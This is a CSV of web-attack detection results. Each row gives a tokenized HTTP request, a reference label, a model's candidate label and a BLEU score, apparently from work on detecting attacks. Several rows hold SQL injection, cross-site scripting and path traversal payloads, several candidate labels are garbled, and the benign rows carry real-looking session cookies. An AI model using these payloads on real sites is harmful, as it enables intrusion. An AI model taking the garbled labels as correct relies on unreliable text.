payload,reference_text,candidate_text,bleu_score
POST / wp - admin / admin - ajax. php HTTP / 1. 1 Host : sv. linkedhrd. com Connection : keep - alive Content - Length : 4 2 Accept : * / * X - Requested - With : XMLHttpRequest User - Agent : Mozilla / 5. 0 ( Windows NT 1 0. 0 ; Win 6 4 ; x 6 4 ) AppleWebKit / 5 3 7. 3 6 ( KHTML COMMA like Gecko ) Chrome / 1 1 7. 0. 0. 0 Safari / 5 3 7. 3 6 Edg / 1 1 7. 0. 2 0 4 5. 3 6 Content - Type : application / x - www - form - urlencoded ; charset = UTF - 8 Origin : http : / / sv. linkedhrd. com Referer : http : / / sv. linkedhrd. com / eforms / 2 0 2 3 0 9 _ kird _ - - _ - / 1 4 3 3 / Accept - Encoding : gzip COMMA deflate Accept - Language : ko COMMA en ; q = 0. 9 COMMA en - US ; q = 0. 8 Cookie : ppwp _ wp _ session = 8 2 e 3 a 2 2 2 6 e 4 4 2 3 6 f 0 5 5 b 4 7 8 ca 7 9 3 0 1 1 2 | | 1 6 9 5 7 0 6 8 3 4 | | 1 6 9 5 7 0 6 4 7 4 form _ id = 1 4 3 3 & action = ipt _ fsqm _ refresh _ nonce,Label : 1 Attack Syntax : Attack Type : CSRF,Label : 1 Attack Syntax : action = wp _ _ _ _ _ ajax Attack Attack Type Type : :,0.2693466632631657
"GET / nvhaproxy / v2 / pc / lazy? blockCodeList = PC - MEDIA - WRAPPER & target = PC - MEDIA - ECONOMIC HTTP / 1. 1 Host : www. naver. com Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Microsoft Edge "" ; v = "" 114 "" Accept : application / json, text / plain, * / * DNT : 1 sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 Edg / 114. 0. 1823. 37 sec - ch - ua - platform : "" Windows "" Sec - Fetch - Site : same - origin Sec - Fetch - Mode : cors Sec - Fetch - Dest : empty Referer : https : / / www. naver. com / Accept - Encoding : gzip, deflate, br Accept - Language : ko, en ; q = 0. 9, en - US ; q = 0. 8, ja ; q = 0. 7 Cookie : NNB = Q7DDIDSJOSBGI ; nid _ inf = - 1234797550 ; NID _ AUT = aHqSUVkD7dGq8tn4pElHInRgvp8O0F4ou0xO + ymNa / dTfq34jwUSbxF7QjvvGpLv ; NID _ JKL = OEmnUYQFORi7yA + nbz + S9Y8HLLQ + hDiArqoBKIoC1JU = ; PM _ CK _ loc = bf6249080784c8eb1fb4654e5b2fd86b7d6aefd3dbe09f40f4e25c6cba75a05e ; nx _ ssl = 2 ; NID _ SES = AAABka5 / weBsZ9drtV5ZFls1AUQia2DrCRIukZ498r5V1lZB9 + + kZxOdjbj05ckg / hRoc0izIOg3 / / pt + arLmmcR",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = 3fd874065358100c79a253f01c3815a3 _ 23440 & sid = 8c15331d0b1391ee237c53f01c3815a3 _ 23440 & guuid = 3fd874065358100c79a253f01c3815a3 _ 23440 & expired = 1617325240 & dr = https : / / www. google. com / & XDR = & dt = Korean Culture and Information Service & du = http : / / 27. 101. 217. 108 / eng / openNews / view. do? seq = 12410 & langCode = lang002 & menuName = & menucode = menu0168 & menuType = Kocis _ Board _ Common & ctrcode = & searchType = & searchText = & rn = 50 & js = Y & sr = 1366x768 & scd = 24 & je = N & tz = 7 & tye = 2021 & tmo = 4 & tda = 2 & tho = 7 & tmi = 30 & tse = 40 & lng = en - US & os = Win32 & cpu = & vr = 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 & ck = Y & brsz = 1366x657 & isnw = Y HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 \ r \ nAccept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ r \ nReferer : http : / / 27. 101. 217. 108 / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : en - US, en ; q = 0. 9",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / / planprd / banner _ MAINCORNER / 567792712 _ 01. jpg HTTP / 1. 1 Host : image. gsshop. com Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Google Chrome "" ; v = "" 114 "" If - None - Match : "" 64826f8b : 7ac8 "" If - Modified - Since : Fri, 09 Jun 2023 00 : 17 : 15 GMT sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : same - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / www. gsshop. com / Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : appmediatype = BV ; browsertype = PC ; wa _ randnum = 165821714698563027810 ; wa _ pcid = RBir04CTyfjMQT9WXxpte ; a1 _ gid = fYBDEl8yWgkAAOco ; _ fbp = fb. 1. 1658217157484. 414468328 ; _ wp _ uid = 2 - 27fdfd92f751e2c7141ddfc22d422857 - s1577348906. 0117 | windows _ 10 | chrome - rnuehf ; mainRcmdLayer = done ; ab180ClientId = 5a0b994d - 87cc - 4f10 - b698 - 06cdb1124cc9 ; pcid = 16631425597284961654153 ; _ ACU125300 = 1666766749313263927. 1666766749",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"http : / / - ip - : - port - / dvwa / instructions. php / dvwa / instructions. php? doc = - 1188 %'/ * * / OR / * * / 8385 = 3641 # sqlmap / 1. 5. 1. 40 # dev ( http : / / sqlmap. org ) PHPSESSID = jlpd56fppfes3q8njmedlrscgq ; security = impossible,",Label : 1 Attack Syntax : / dvwa / instructions. php? doc = - 1188 %'/ * * / OR / * * / 8385 = 3641 # Attack Type : SQL Injection,Label : 1 Attack Syntax : http : / / - ip - : - port - / dvwa / instructions . php / dvwa / instructions . php ? doc = - - % ' / * * / OR / * * / 4493 = = # Attack Type : SQL Injection,0.34258156650440286
"GET / HTTP / 1. 1 Host : www. ncsc. go. kr : 4018 Connection : keep - alive sec - ch - ua : "" Chromium "" ; v = "" 110 "", "" Not A ( Brand "" ; v = "" 24 "", "" Google Chrome "" ; v = "" 110 "" sec - ch - ua - mobile :? 0 sec - ch - ua - platform : "" Windows "" Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 110. 0. 0. 0 Safari / 537. 36 Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, image / avif, image / webp, image / apng, * / * ; q = 0. 8, application / signed - exchange ; v = b3 ; q = 0. 7 Sec - Fetch - Site : cross - site Sec - Fetch - Mode : navigate Sec - Fetch - User :? 1 Sec - Fetch - Dest : document Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : WMONID = - tDT7LEQjkM ; JSESSIONID = TgnqxRaTThn0Ika1UzaWqszgdbyaCzeg1ameN79ncTVAynoYxJaC5hn5B1ZO58wL. nweb4 _ servlet _ ncsc ; maindiv = done",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / board / board _ write? code = < i + onkeyup = "" alert ( 1 ) "" + contenteditable > test < / i > HTTP / 1. 1 Host : 10. 0. 20. 20 User - Agent : Mozilla / 5. 0 ( X11 ; Linux i686 ; rv : 60. 0 ) Gecko / 20100101 Firefox / 60. 0 Accept - Encoding : gzip, deflate Accept : text / html, application / xhtml + xml, application / xml ; q = 0. 9, * / * ; q = 0. 8 Connection : close Accept - Language : en - US, en ; q = 0. 5 DNT : 1 Upgrade - Insecure - Requests : 1","Label : 1 Attack Syntax : < i onkeyup = "" alert ( 1 ) "" contenteditable > test < / i > Attack Type : Cross - Site Scripting ( XSS )","Label : 1 Attack Syntax : script + = "" alert ( 1 ) "" > > test < / > > Attack Type : Cross - Site Scripting ( XSS )",0.6847789143057466
"GET / InsightTrk / tracker. do? pfno = 1157 & uuid = 95a9f31f792ae005623befd7be7d66fb _ 82472 & sid = a6d5b71a6d91324d722fefd7be7d66fb _ 82472 & guuid = 95a9f31f792ae005623befd7be7d66fb _ 82472 & expired = 1617885592 & dr = http : / / www. kocis. go. kr / eng / main. do & XDR = & dt = Korean Culture and Information Service & du = http : / / www. kocis. go. kr / eng / openPublications. do & js = Y & sr = 800x600 & scd = 24 & je = N & tz = 1 & tye = 2021 & tmo = 4 & tda = 8 & tho = 13 & tmi = 9 & tse = 52 & lng = fr - FR & os = Win32 & cpu = & vr = 5. 0 ( Windows NT 6. 1 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 & ck = Y & brsz = 800x489 & isnw = N HTTP / 1. 1 \ r \ nHost : logger. kcisa. kr \ r \ nConnection : keep - alive \ r \ nUser - Agent : Mozilla / 5. 0 ( Windows NT 6. 1 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 89. 0. 4389. 114 Safari / 537. 36 \ r \ nAccept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 \ r \ nReferer : http : / / www. kocis. go. kr / \ r \ nAccept - Encoding : gzip, deflate \ r \ nAccept - Language : fr - FR, fr ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7, ar ; q = 0. 6",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET / tillionpanel2 / survey _ question _ item / 202304 / 30 / ws1304b05f5747e8c2ca7d25b85c3259140909717af0ac1df588c05a494f25d04c. png HTTP / 1. 1 Host : storage. heypoll. co. kr Connection : keep - alive sec - ch - ua : "" Not. A / Brand "" ; v = "" 8 "", "" Chromium "" ; v = "" 114 "", "" Google Chrome "" ; v = "" 114 "" sec - ch - ua - mobile :? 0 User - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 114. 0. 0. 0 Safari / 537. 36 sec - ch - ua - platform : "" Windows "" Accept : image / avif, image / webp, image / apng, image / svg + xml, image / *, * / * ; q = 0. 8 Sec - Fetch - Site : same - site Sec - Fetch - Mode : no - cors Sec - Fetch - Dest : image Referer : https : / / www. heypoll. co. kr / Accept - Encoding : gzip, deflate, br Accept - Language : ko - KR, ko ; q = 0. 9, en - US ; q = 0. 8, en ; q = 0. 7 Cookie : _ ga = GA1. 1. 1416345691. 1577430737 ; _ ga _ G8ZZ4D406M = GS1. 1. 1659686925. 29. 0. 1659686925. 60 ; JSESSIONID = 358C1C21AEEFBA18F424BA00823856C9 ; _ ga _ 816P0FY7DV = GS1. 1. 1686298337. 514. 1. 1686298353. 44. 0. 0",Label : 0 Attack Syntax : nan Attack Type : nan,Label : 0 Attack Syntax : nan Attack Type : nan,1.0
"GET /.. /.. /.. /.. /.. /.. / winnt / win. ini HTTP / 1. 1Connection : Keep - AliveHost : lib. mmk. or. krPragma : no - cacheCache - Control : no - cacheUser - Agent : Mozilla / 5. 0 ( Windows NT 10. 0 ; Win64 ; x64 ) AppleWebKit / 537. 36 ( KHTML, like Gecko ) Chrome / 97. 0. 4692. 99 Safari / 537. 36Accept : image / gif, image / x - xbitmap, image / jpeg, image / pjpeg, image / png, * / * Accept - Language : enAccept - Charset : iso - 8859 - 1, *, utf - 8",Label : 1 Attack Syntax :.. /.. /.. /.. /.. /.. / winnt / win. ini Attack Type : Path Traversal,Label : 1 Attack Syntax : . . / . . . . . . . . . . . . . / / . / / / Type Path Path Path,0.12913533075470382
